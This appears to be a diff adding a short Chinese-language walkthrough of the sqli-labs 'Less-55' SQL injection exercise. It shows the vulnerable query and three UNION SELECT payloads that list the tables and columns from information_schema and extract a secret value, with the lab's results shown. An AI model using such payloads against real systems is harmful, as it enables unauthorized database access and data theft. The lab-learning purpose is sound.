@@ -1,0 +1,7 @@
+<hr>
+<h2 id="title-less55url-https-www-yuque-com-u29002979-ep2zrx-tka2r9ivly3e3slv"><a href="#title-less55url-https-www-yuque-com-u29002979-ep2zrx-tka2r9ivly3e3slv" class="headerlink" title="title: less55url: https://www.yuque.com/u29002979/ep2zrx/tka2r9ivly3e3slv"></a>title: less55<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/tka2r9ivly3e3slv">https://www.yuque.com/u29002979/ep2zrx/tka2r9ivly3e3slv</a></h2><pre><code class="bash">$sql=&quot;SELECT * FROM security.users WHERE id=($id) LIMIT 0,1&quot;;
+</code></pre>
+<p>闭合方式为小括号),一共十四次机会\ <a name="qqbdN"></a></p>
+<h1 id="爆破数据表"><a href="#爆破数据表" class="headerlink" title="爆破数据表"></a>爆破数据表</h1><p><code>?id=-1) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+</code>&amp;#x20;<br>数据表：3cr26yzl9f <a name="bNqYh"></a></p>
+<h1 id="爆破数据字段"><a href="#爆破数据字段" class="headerlink" title="爆破数据字段"></a>爆破数据字段</h1><p><code>?id=-1) union select 1,2,group_concat(column_name)from information_schema.columns where table_name=&#39;3cr26yzl9f&#39;--+</code>&amp;#x20;<br>字段：secret_TATB <a name="VdFKq"></a></p>
+<h1 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h1><p><code>?id=-1) union select 1,2,(select secret_TATB from 3cr26yzl9f)--+</code><br>密码：zXYZR5qfxz3Q2LUi8v1ip6dx</p>
